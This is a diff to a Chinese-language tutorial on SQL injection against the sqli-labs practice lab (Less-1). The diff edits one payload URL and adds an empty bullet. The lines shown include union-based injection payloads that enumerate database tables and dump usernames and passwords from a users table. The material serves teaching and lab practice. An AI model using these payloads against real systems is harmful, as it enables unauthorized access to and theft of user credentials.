@@ -63,7 +63,7 @@ SQL注入有以下几种方式：
 
   ![aAXvZV.png](https://s1.ax1x.com/2020/07/28/aAXvZV.png)
 
-- 已知了所有的数据库之后，可以去尝试去查询数据库里所有的表名，这里查询“security”数据库里所有的表。构造**http://xxxx/sqli/Less-1/?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+**
+- 已知了所有的数据库之后，可以去尝试去查询数据库里所有的表名，这里查询“security”数据库里所有的表。构造**http://xxxx/sqli/Less-1/?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+**
 
   ![aAXXq0.png](https://s1.ax1x.com/2020/07/28/aAXXq0.png)
 
@@ -74,4 +74,6 @@ SQL注入有以下几种方式：
 - 尝试从当前表中获取到username和password，构造**http://xxxx/Less-1/?id=-1' union select 1,username,password from users where id=2--+**，更换不同的id值，可以查看不同用户的信息。
 
   ![aAjpiF.png](https://s1.ax1x.com/2020/07/28/aAjpiF.png)
+
+- 
 
